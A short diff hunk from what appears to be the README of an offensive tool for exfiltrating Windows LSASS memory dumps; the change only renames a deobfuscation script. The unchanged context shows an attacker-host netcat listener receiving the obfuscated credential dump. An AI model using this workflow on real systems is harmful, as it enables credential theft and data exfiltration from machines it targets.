@@ -61,6 +61,6 @@ Upload the obfuscated LSASS dump onto a remote location:
 Attacker host:
 ```
 nc -lnp 1234 > lsass.dmp
-python3 deobfuscator.py --dumpname lsass.dmp
+python3 deobfuscate.py --dumpname lsass.dmp
 ```
 
